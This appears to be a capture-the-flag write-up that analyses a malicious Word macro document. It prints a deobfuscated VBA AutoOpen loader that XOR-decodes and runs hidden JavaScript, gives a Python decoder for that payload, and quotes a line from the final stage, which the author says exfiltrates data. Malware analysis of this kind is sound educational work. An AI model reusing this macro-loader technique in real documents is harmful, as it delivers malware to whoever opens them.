**Challenge Difficulty: Hard**

## Extracting the Script
This challenge starts with a .docm file and we're told that it contains something interesting. Poking around the file, we can see that there's a visual basic script contained within. First, we extract the script using:
```shell
binwalk -e invitation.docm
```
Navigating through this, we find our visual basic script under the directory `/_invitation.docm.extracted/word/vbaProject.bin`. We'll need to extract the visual basic script using the command:
```shell
olevba vbaProject.bin > extracted.txt
```

## Deobfuscating
From here, we see an absolute mess of a visual basic script. Variable names are all over the place, so we'll need to clean this up to understand what it's doing. Here's the script with some variables renamed and the unimportant parts removed:
```vb
Function Decode(given_string() As Byte, length As Long) As Boolean
Dim xor_key As Byte
xor_key = 45
For i = 0 To length - 1
given_string(i) = given_string(i) Xor xor_key
xor_key = ((xor_key Xor 99) Xor (i Mod 254))
Next i
Decode = True
End Function

Sub AutoOpen()
...

Else

Dim doc_file
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
doc_file = FreeFile
Open (ActiveDocument.FullName) For Binary As #doc_file
Dim doc_array() As Byte
ReDim doc_array(file_length)
Get #doc_file, 1, doc_array

Dim document_string As String                  
document_string = StrConv(doc_array, vbUnicode)
Dim single_regex_match, regex_pattern_matches
Dim regex_obj
    Set regex_obj = CreateObject("vbscript.regexp")
    regex_obj.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
    Set regex_pattern_matches = regex_obj.Execute(document_string)

Dim js_start_pos
If regex_pattern_matches.Count = 0 Then
GoTo regex_not_found
End If

For Each single_regex_match In regex_pattern_matches
js_start_pos = single_regex_match.FirstIndex
Exit For
Next
Dim byte_array_for_js() As Byte
Dim js_len As Long
js_len = 13082
ReDim byte_array_for_js(js_len)
Get #doc_file, js_start_pos + 81, byte_array_for_js

If Not Decode(byte_array_for_js(), js_len + 1) Then
GoTo regex_not_found
...
End Sub
```

After renaming quite a bit, we can see that the script:
1. Checks it's environment to see if it should run (removed for simplicity)
2. Given it's in the correct environment, loads the document
3. Looks for a regex within the document starting with the line: `sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa`
4. Decodes a 13802 bytes from this starting point using the Decode() function
    - The decode function takes a string and performs an XOR on each character using the equation: `((45 Xor 99) Xor (i Mod 254))` where **i** is the current indice
5. Executes the decoded string with the argument `vF8rdgMHKBrvCoCp0ulm` (removed for simplicity)

After figuring this out, we can write our python decode script:
```py
import re
from pathlib import Path

def decode_bytes(byte_array):
    xor_key = 45
    decoded_array = bytearray(len(byte_array))
    for i in range(len(byte_array)):
        decoded_array[i] = byte_array[i] ^ xor_key
        xor_key = ((xor_key ^ 99) ^ (i % 254))
    return decoded_array

doc_path = Path("invitation.docm")
doc_bytes = doc_path.read_bytes()

pattern = b"sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
pattern_pos = doc_bytes.find(pattern)

if pattern_pos != -1:
    js_start_pos = pattern_pos + len(pattern)
    js_len = 13082
    byte_array_for_js = doc_bytes[js_start_pos:js_start_pos+js_len]

    decoded_js = decode_bytes(byte_array_for_js)
    js_code = decoded_js.decode('utf-8', errors='ignore')
    print(js_code)
else:
    print("Pattern not found in the document.")
```

We can simple just run this and output it to a file.
## Extracting Javascript and Finding the Flag
After running our decoder on the original document, we get a javascript file. It also looks like an absolute nightmare to deal with, so we pretty print it. To save all of us from the headache of having to look at a massive obfuscated block of javascript, the js file takes in a key (that we have) and uses it to deobfuscate and run another block of obfuscated code. We can just do this in the console of a browser, removing the call to run the code and just deobfuscating the file.

From here, we get another large javascript file that looks like it's exfiltrating a lot of data. Going to line 238 of the file, we see the line:
```js
S47T.SETREQUESTHEADER('Cookie:', 'flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=');
```

Base64 decoding this, we get our flag:
`HTB{m4ld0cs_4r3_g3tt1ng_Tr1cki13r}`